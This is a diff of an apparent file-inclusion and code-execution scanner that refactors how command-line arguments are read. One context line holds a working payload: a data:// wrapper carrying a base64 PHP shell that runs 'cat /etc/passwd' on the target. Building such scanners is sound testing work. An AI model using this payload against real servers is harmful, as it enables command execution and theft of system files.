@@ -2,7 +2,7 @@
 import urllib.parse as urlparse
 from urllib.parse import urlparse, parse_qs
 
-from src.utils.arguments import args
+from src.utils.arguments import ArgumentHandler
 from src.configs import config
 from src.utils.encodings import encode
 from src.httpreqs.request import prepareRequest
@@ -12,13 +12,14 @@ from src.utils import colors
 
 def test_data(url, post):
     """Test Data"""
-    if args.verbose:
+    args = ArgumentHandler()
+    if args.args['verbose']:
         print(colors.blue("[i]") + " Testing with data wrapper...")
 
     tests = []
 
     # Testing the URL parameter, payload and then &cmd is added
-    if args.param in url:
+    if args.args['param'] in url:
         tests.append(
             "data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20%2Fetc%2Fpasswd"
         )
@@ -27,7 +28,7 @@ def test_data(url, post):
         )
 
         for _, test in enumerate(tests):
-            u, reqHeaders, postTest = prepareRequest(args.param, test, url, post)
+            u, reqHeaders, postTest = prepareRequest(args.args['param'], test, url, post)
             _, br = REQUEST(u, reqHeaders, postTest, config.proxies, "RCE", "DATA")
 
             if not br:
@@ -51,7 +52,7 @@ def test_data(url, post):
     )
 
     for _, url_item in enumerate(urls):
-        url, reqHeaders, postTest = prepareRequest(args.param, test, url, post)
+        url, reqHeaders, postTest = prepareRequest(args.args['param'], test, url, post)
         _, br = REQUEST(
             url + encode(url_item),
             reqHeaders,
